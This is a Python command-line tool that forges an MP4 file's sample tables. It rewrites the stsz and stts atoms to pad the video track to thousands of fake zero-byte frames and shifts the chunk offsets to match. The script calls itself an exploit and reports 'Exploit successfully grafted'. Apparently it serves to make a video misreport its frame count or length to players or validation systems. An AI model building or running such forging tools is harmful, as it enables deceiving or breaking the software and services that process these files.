import sys
import os

CONTAINERS = [b'moov', b'trak', b'mdia', b'minf', b'stbl', b'edts']

def read_atoms(f, end_pos):
    """Recursively parses the MP4 binary tree into a dictionary structure."""
    atoms = []
    while f.tell() < end_pos:
        start = f.tell()
        size_bytes = f.read(4)
        if not size_bytes: break
        size = int.from_bytes(size_bytes, 'big')
        name = f.read(4)
        
        if size == 1: # 64-bit extended size
            size = int.from_bytes(f.read(8), 'big')
            header_size = 16
        else:
            header_size = 8
            
        if name in CONTAINERS:
            children = read_atoms(f, start + size)
            atoms.append({'name': name, 'children': children})
        else:
            data = f.read(size - header_size)
            atoms.append({'name': name, 'data': data})
    return atoms

def write_atoms(f, atoms):
    """Writes the parsed tree back to binary, dynamically recalculating parent sizes."""
    for atom in atoms:
        if 'children' in atom:
            start = f.tell()
            f.write(b'\x00\x00\x00\x00') # Placeholder for size
            f.write(atom['name'])
            write_atoms(f, atom['children'])
            end = f.tell()
            # Go back and write the true recalculated size
            f.seek(start)
            f.write((end - start).to_bytes(4, 'big'))
            f.seek(end)
        else:
            size = 8 + len(atom['data'])
            f.write(size.to_bytes(4, 'big'))
            f.write(atom['name'])
            f.write(atom['data'])

def find_atom(atoms, path):
    """Helper to navigate the nested atom tree (e.g., moov -> trak -> mdia)."""
    if not path: return atoms
    for atom in atoms:
        if atom['name'] == path[0]:
            if len(path) == 1: return atom
            if 'children' in atom:
                res = find_atom(atom['children'], path[1:])
                if res: return res
    return None

def inject_fake_frames(input_path, output_path, target_frames=25570):
    print(f"[*] Loading MP4 binary tree from {input_path} into RAM...")
    
    file_size = os.path.getsize(input_path)
    with open(input_path, 'rb') as f:
        tree = read_atoms(f, file_size)

    moov = find_atom(tree, [b'moov'])
    if not moov:
        print("[-] Error: 'moov' atom not found. Is this a valid MP4?")
        sys.exit(1)

    # 1. Locate the correct Video Track
    video_trak = None
    for atom in moov['children']:
        if atom['name'] == b'trak':
            hdlr = find_atom([atom], [b'trak', b'mdia', b'hdlr'])
            if hdlr and b'vide' in hdlr['data']:
                video_trak = atom
                break

    if not video_trak:
        print("[-] Error: Could not isolate the video track.")
        sys.exit(1)

    stbl = find_atom([video_trak], [b'trak', b'mdia', b'minf', b'stbl'])

    # 2. Hack the stsz (Sample Size) Box
    stsz = find_atom(stbl['children'], [b'stsz'])
    stsz_data = bytearray(stsz['data'])
    
    orig_count = int.from_bytes(stsz_data[8:12], 'big')
    diff = target_frames - orig_count
    
    if diff <= 0:
        print(f"[*] File already has {orig_count} frames. No inflation needed.")
        sys.exit(0)

    print(f"[*] Forging stsz atom: Inflating from {orig_count} to {target_frames} frames...")
    stsz_data[8:12] = target_frames.to_bytes(4, 'big') # Overwrite count
    stsz_data.extend(b'\x00\x00\x00\x00' * diff)       # Inject 0-byte dummy frames
    stsz['data'] = bytes(stsz_data)

    # 3. Hack the stts (Time to Sample) Box
    stts = find_atom(stbl['children'], [b'stts'])
    stts_data = bytearray(stts['data'])
    first_entry_count = int.from_bytes(stts_data[8:12], 'big')
    print("[*] Forging stts atom timings...")
    stts_data[8:12] = (first_entry_count + diff).to_bytes(4, 'big')
    stts['data'] = bytes(stts_data)

    # 4. Shift Chunk Offsets (Crucial for +faststart compatibility)
    shift_amount = diff * 4
    print(f"[*] Dynamically shifting container pointers by +{shift_amount} bytes...")
    
    for trak in moov['children']:
        if trak['name'] == b'trak':
            t_stbl = find_atom([trak], [b'trak', b'mdia', b'minf', b'stbl'])
            
            stco = find_atom(t_stbl['children'], [b'stco'])
            if stco:
                co_data = bytearray(stco['data'])
                entry_count = int.from_bytes(co_data[4:8], 'big')
                for i in range(entry_count):
                    idx = 8 + i * 4
                    old_val = int.from_bytes(co_data[idx:idx+4], 'big')
                    co_data[idx:idx+4] = (old_val + shift_amount).to_bytes(4, 'big')
                stco['data'] = bytes(co_data)
                
            co64 = find_atom(t_stbl['children'], [b'co64'])
            if co64:
                co_data = bytearray(co64['data'])
                entry_count = int.from_bytes(co_data[4:8], 'big')
                for i in range(entry_count):
                    idx = 8 + i * 8
                    old_val = int.from_bytes(co_data[idx:idx+8], 'big')
                    co_data[idx:idx+8] = (old_val + shift_amount).to_bytes(8, 'big')
                co64['data'] = bytes(co_data)

    print(f"[*] Writing completely restructured container to {output_path}...")
    with open(output_path, 'wb') as f:
        write_atoms(f, tree)
        
    print("[+] Exploit successfully grafted.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python stsz_injector.py <input.mp4> <output.mp4>")
        sys.exit(1)
        
    inject_fake_frames(sys.argv[1], sys.argv[2])
